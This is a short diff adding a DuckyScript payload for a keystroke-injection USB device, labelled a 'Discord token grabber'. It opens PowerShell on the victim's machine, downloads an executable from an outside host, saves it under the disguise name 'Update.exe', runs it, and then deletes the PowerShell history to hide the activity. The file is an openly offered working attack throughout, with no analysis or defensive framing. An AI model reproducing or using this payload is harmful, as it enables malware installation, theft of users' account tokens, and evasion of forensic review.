@@ -1,0 +1,15 @@
+REM Title: Discord token grabber
+REM Author: Alejandro12120
+REM Version: 1.2
+REM It stoles discord tokens
+REM
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+STRING $down = New-Object System.Net.WebClient; $url = 'https://f.tuculito.com/file/74455bf9/go.exe'; $file = 'Update.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file);
+ENTER
+DELAY 500
+STRING $history = (Get-PSReadlineOption).HistorySavePath; Remove-Item $history; exit;
+ENTER
